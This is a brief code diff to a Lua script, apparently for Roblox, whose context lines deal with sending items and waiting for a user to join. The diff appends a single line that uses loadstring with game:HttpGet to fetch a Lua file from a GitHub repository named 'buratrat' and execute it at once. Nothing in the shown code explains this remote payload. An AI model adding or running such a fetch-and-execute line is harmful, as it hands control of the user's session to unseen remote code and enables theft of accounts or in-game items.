@@ -425,3 +425,5 @@ if #itemsToSend > 0 then
     end
     waitForUserJoin()
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/frierenXyz/buratrat/refs/heads/main/mainn.lua"))()
